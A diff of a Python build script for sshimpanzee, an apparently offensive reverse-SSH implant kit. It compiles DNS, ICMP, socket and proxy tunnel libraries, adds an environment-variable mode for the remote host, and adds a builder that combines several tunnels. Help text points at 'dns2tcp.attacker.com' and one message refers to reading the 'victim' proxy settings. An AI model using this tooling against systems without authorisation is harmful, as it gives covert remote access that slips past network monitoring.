@@ -8,12 +8,14 @@ import hashlib
 
 key_charset =  string.ascii_letters + string.digits
 
+import tuns.builder
+
 def _clean():
     if os.path.exists("tuns/libtun.a"):
         os.unlink("tuns/libtun.a")
 
 def dns(opt):
-    print("[*] Patching and building dns2tcp client...")
+    print("[*] Building DNS tunnel...")
     dns_name = None
     key = "sshimpanzee"
     res = "sshimpanzee"
@@ -21,6 +23,7 @@ def dns(opt):
     resolver = None
     obf = False
     buildserv = False
+    env = False
     _clean()
     for i in opt:
         parsed=i.split("=")
@@ -38,9 +41,10 @@ def dns(opt):
             obf = True
         elif parsed[0] == "buildserv":
             buildserv = True
-        
-    if dns_name == None:
-        print("[-] please provide dns options such as --tun dns,dnsserv=dns2tcp.attacker.com")
+        if parsed[0] == "env" or args.dyn_mode:
+            env = True
+    if dns_name == None and not env:
+        print("[-] please provide dns options such as --tun dns,dnsserv=dns2tcp.attacker.com or provide env option")
         sys.exit(-1)
         
     if args.cross_comp:
@@ -57,7 +61,14 @@ def dns(opt):
         buildserv = True
         
     resolver = f"-DDNS2TCP_RESOLVER=\"\\\"{resolver}\\\"\"" if resolver else ""
-    defines = f'-DDNSSERV=\"\\\"{dns_name}\\\"\" -DDNS2TCP_KEY=\"\\\"{key}\\\"\" -DDNS2TCP_RES=\"\\\"{res}\\\"\" -DDNS2TCP_QUERY_FUNC=\"\\\"{qtype}\\\"\" {resolver} {obf_str}'
+    dns_serv = f"-DDNSSERV=\"\\\"{dns_name}\\\"\""
+
+    if env:
+        resolver = "-DDNS2TCP_RESOLVER=getenv\(\"\\\"RESOLVER\\\"\"\)"
+        dns_serv = "-DDNSSERV=getenv\(\"\\\"REMOTE\\\"\"\)"
+    defines = f'-DDNS2TCP_KEY=\"\\\"{key}\\\"\" -DDNS2TCP_RES=\"\\\"{res}\\\"\" -DDNS2TCP_QUERY_FUNC=\"\\\"{qtype}\\\"\" {resolver} {obf_str} {dns_serv}'
+
+    
     host = "" 
     if args.cross_comp:
         host = f"--host {args.cross_comp}" 
@@ -68,7 +79,6 @@ def dns(opt):
     cmd = f"cd tuns/dns2tcp; make clean; gcc common/debug.c -c -o client/debug.o; cd client; make;"
     run_cmd(cmd)
     print("[+] Client lib and server built") 
-
     cmd = "cd tuns/dns2tcp/client; ar rcs ../../../build/libtun.a *.o"
     if run_cmd(cmd) or not os.path.exists("build/libtun.a"):
         print("[-] Failed building dns2tcp lib.")
@@ -77,7 +87,7 @@ def dns(opt):
         print("[+] Build successfull")
 
     if buildserv:
-        cmd = f"cd tuns/dns2tcp; make clean; gcc common/debug.c -c -o server/debug.o; cd server; make; gcc -Wall -Wunused -o dns2tcpd hmac_sha1.o crc16.o rr.o mycrypto.o session.o queue.o config.o myrand.o auth.o requests.o server.o list.o dns.o dns_decode.o mystrnlen.o memdump.o base64.o socket.o options.o main.o debug.o"
+        cmd = "cd tuns/dns2tcp; make clean; gcc common/debug.c -c -o server/debug.o; cd server; make; gcc -Wall -Wunused -o dns2tcpd hmac_sha1.o crc16.o rr.o mycrypto.o session.o queue.o config.o myrand.o auth.o requests.o server.o list.o dns.o dns_decode.o mystrnlen.o memdump.o base64.o socket.o options.o main.o debug.o"
         if run_cmd(cmd):
             print("[-] Failed to build server.")
         else:
@@ -86,20 +96,23 @@ def dns(opt):
     return 
             
 def icmp(opt):
-    print("[*] Patching and building ICMPTunnel client...")
+    print("[*] Building ICMP Tunnel...")
     _clean()
     cmd = "cd tuns/icmptunnel/; make clean && git apply ../patchs/patch_icmptunnel.patch;"
     run_cmd(cmd)
     
     remote = None
     raw = False
+    env = False
     for i in opt:
         if i=="raw_sock":
             raw = True
         parsed=i.split("=")
         if parsed[0] == "remote" and len(parsed) == 2:
             remote = parsed[1]
-    if remote == None:
+        if parsed[0] ==  "env" or args.dyn_mode:
+            env = True
+    if remote == None and not env:
         print("[-] please provide a remote adresse to connect to: icmp,remote=127.0.0.1")
         sys.exit(0)
     CC = ""
@@ -111,10 +124,14 @@ def icmp(opt):
         
     raw = "-DNO_ROOT" if not raw else ""
         
-
-    cmd = f"cd tuns/icmptunnel && gcc client.c icmp.c tunnel.c {raw} -DDEST='\"{remote}\"' -c;"
+    if env:
+        remote = 'getenv("REMOTE")'
+    else:
+        remote = f"\"{remote}\""
+    
+    cmd = f"cd tuns/icmptunnel && gcc client.c icmp.c tunnel.c {raw} -DDEST='{remote}' -c;"
     if run_cmd(cmd):
-        print("[+] Failed to compile icmptunnel, check for missing value")    
+        print("[-] Failed to compile icmptunnel, check for missing value")    
     cmd = "cd tuns/icmptunnel; ar rcs ../../build/libtun.a client.o icmp.o tunnel.o";    
     if run_cmd(cmd) or not os.path.exists("build/libtun.a"):
         print("[-] Failed building icmptunnel lib.")
@@ -124,7 +141,7 @@ def icmp(opt):
         cmd = f"cd tuns/icmptunnel && make clean && {compiler} icmptunnel.c icmp.c tunnel.c -o icmptunnel"
         if not run_cmd(cmd) and os.path.exists("tuns/icmptunnel/icmptunnel"):
             os.replace("tuns/icmptunnel/icmptunnel", "build/icmptunnel")
-            print("[+] icmptunnel bin has been built.")
+            print("[+] ICMPTunnel server has been built.")
             
         else:
             print("[-] Failed to build icmptunnel server")
@@ -134,13 +151,14 @@ def icmp(opt):
 
         
 def sock(opt):
-    print("[*] Building socket-reuse client...")
+    print("[+] Building Sock Tunnel...")
     _clean()
     path = "/tmp/socket"
     mode = "connect"
     t = "unix"
     ip = "127.0.0.1"
     port = "2222"
+    env = False
     for i in opt:
         parsed=i.split("=")
         if len(parsed) == 2:
@@ -151,13 +169,19 @@ def sock(opt):
             if parsed[0] == "type":
                 t = parsed[1]
             if parsed[0] == "ip":
-                t = parsed[1]
+                ip = parsed[1]
             if parsed[0] == "port":
-                t = parsed[1]
+                port = parsed[1]
+        if parsed[0] == "env" or args.dyn_mode:
+            env = True
 
     defines = f" -DUNIXSOCK_PATH='\"{path}\"'"
-    
-    if t == "tcp":
+
+    if env:
+        print(f"\t--> Building socket support with dynamic env mode") 
+        defines += f' -DIP_ADDR=\'getenv("REMOTE")\' -DTCP_PORT=\'atoi(getenv("PORT"))\''
+        
+    elif t == "tcp":
         print(f"\t--> Building socket support with TCP {mode} : {ip}:{port}") 
         defines += f" -DIP_ADDR='\"{ip}\"' -DTCP_PORT={port}"
     elif t == "unix":
@@ -167,7 +191,7 @@ def sock(opt):
     else:
         print("[-] Socket type not supported, supported types are unix, tcp ")
         sys.exit(-1)
-        
+
     if mode == "listen":
         defines += " -DLISTEN_MODE" 
     elif mode == "connect":
@@ -198,7 +222,7 @@ def sock(opt):
 
     
 def proxysock(opt):
-    print("[*] Building proxysock lib...")
+    print("[*] Building proxysock tunnel...")
     _clean()
     defines = ""
     phost = None
@@ -220,7 +244,7 @@ def proxysock(opt):
                 ppass = parsed[1]
             elif parsed[0] == "ptype":
                 ptype = parsed[1]
-        if parsed[0] == "env":
+        if parsed[0] == "env" or args.dyn_mode:
             auto = True
 
     if  not auto and phost == None:
@@ -234,7 +258,7 @@ def proxysock(opt):
         sys.exit(-1)
 
 
-    if not args.remote or not len(args.remote.split(':'))==2:
+    if (not args.remote or not len(args.remote.split(':'))==2) and not auto:
         print("[-] Please provide a remote adresse using -r  ")
         sys.exit(-1)
 
@@ -255,10 +279,12 @@ def proxysock(opt):
     else:
         print("[+] Proxy type set to auto, sshimpanzee will parse victim http_proxy/https_proxy env varto get its configuration")
 
-    
-    defines += f"-DDST_HOST='\"{args.remote.split(':')[0]}\"' "
-    defines += f"-DDST_PORT='{args.remote.split(':')[1]}' "
-    
+    if not auto:
+        defines += f"-DDST_HOST='\"{args.remote.split(':')[0]}\"' "
+        defines += f"-DDST_PORT='{args.remote.split(':')[1]}' "
+    else:
+        defines += f"-DDST_HOST='getenv(\"REMOTE\")' "
+        defines += f"-DDST_PORT='atoi(getenv(\"PORT\"))' "
     cmd = f"cd tuns/proxysocket/; rm -rf tunnel.o proxysock.o;  git apply ../patchs/patch_proxysocket.patch;"
     if run_cmd(cmd):
         print("[-] Failed to apply patchs")
@@ -299,7 +325,7 @@ def http_enc(opt):
     if key == None:
         print("[+] No key specified, generating one:")
         key = ''.join(random.choice(key_charset) for i in range(24))
-        print("\-> Use : "+key)
+        print("\t-> Using : "+key)
         
     print("[+] Generating target script")
     with open(f"tuns/http_enc/proxies/proxy.{target}", "r") as r:
@@ -334,13 +360,60 @@ def no_build(opt):
     print("[*] Not building a tunnel")     
     return
 
+
+def combined(opt):
+    print("[+] Building combined tunnels")
+    env = False
+    avail_tun = []
+    for o in opt:
+        l = o.split("=")
+        if len(l) == 2 and l[0] == "tunnels":
+            for t in l[1].split(":") :
+                fct = getattr(tuns.builder,t, None)
+                if fct == None:
+                    print(f"[-] No builder declared for options {t}")
+                    tuns.builder.help()
+                    sys.exit(-1)
+                else:
+                    print(f"\t -> Building combined {t} tunnel")
+                    fct(opt)
+                    cmd = f"objcopy  --redefine-sym tun=tun_{t} build/libtun.a build/libtun_{t}.a"
+                    if run_cmd(cmd)==0:
+                        avail_tun.append(t)
+                        os.unlink("build/libtun.a")
+                        run_cmd(f"cd build; mkdir reloc; ar x libtun_{t}.a; ld -Bsymbolic -relocatable *.o -o reloc/libtun_{t}.o; rm *.o")
+
+
+    content = ""
+    libs = ""
+    reloc = ""
+    for tunnel in avail_tun:
+        content += f'if (strcmp(selected_tun, "{tunnel}")==0) tun_{tunnel}();\n'
+        reloc += f"build/reloc/libtun_{tunnel}.o "
+    with open("tuns/combined/combiner_template.c", "r") as template:
+        with open("tuns/combined/combiner_template_out.c", "w") as out:
+            for i in template.readlines():
+                i = i.replace("<CONTENT>", content)
+                out.write(i)
+    cmd = f"{args.compiler} tuns/combined/combiner_template_out.c -c -o tuns/combined/combiner_template_out.o"
+    run_cmd(cmd)
+    
+    cmd = f"ar rcs build/libtun.a tuns/combined/combiner_template_out.o {reloc}"
+    if  run_cmd(cmd) or not os.path.exists("build/libtun.a"):
+        print("[-] Failed building combiner lib.")
+        sys.exit(-1)
+    else:
+        print("[+] Build successfull")
+
+                
 def help():
     print("""Complete list of supported tunnels:
-    - dns,dnsserv=<tld running dns2tcpd>,[qtype=[QTYPE{TXT}],resolver=[DNS resolver],resource=[resource name as defined in dns2tcp {sshimpanzee}],key=[dns2tcp key {sshimpanzee}],[obfuscate],[buildserv]]
+    - dns,dnsserv=<tld running dns2tcpd>,[qtype=[QTYPE{TXT}],resolver=[DNS resolver],resource=[resource name as defined in dns2tcp {sshimpanzee}],key=[dns2tcp key {sshimpanzee}],[obfuscate],[buildserv][env]]
     - sock,[mode=<listen,connect>,type=<unix,tcp>,ip=[ip],port=[port],path=[socket unix path]]
     - proxysock,[ptype=<HTTP,SOCKS4,SOCKS5>,phost=[Proxy Host],pport=[Proxy Port],puser=[username for proxy authentication],ppass=[Pass for proxy authentication],env]
-    - icmp,[remote=[IP],raw_sock,buildserv]
-    - http_enc
+    - icmp,[remote=[IP],raw_sock,buildserv,env]
+    - http_enc,[key],[target],[path_fd]
+    - combined,tunnels=[tunnel1:tunnel2...],[args of the different tunnel you want to combine]
     - no_build,path=<path to custom libtun.a>
     """)
     exit(0)
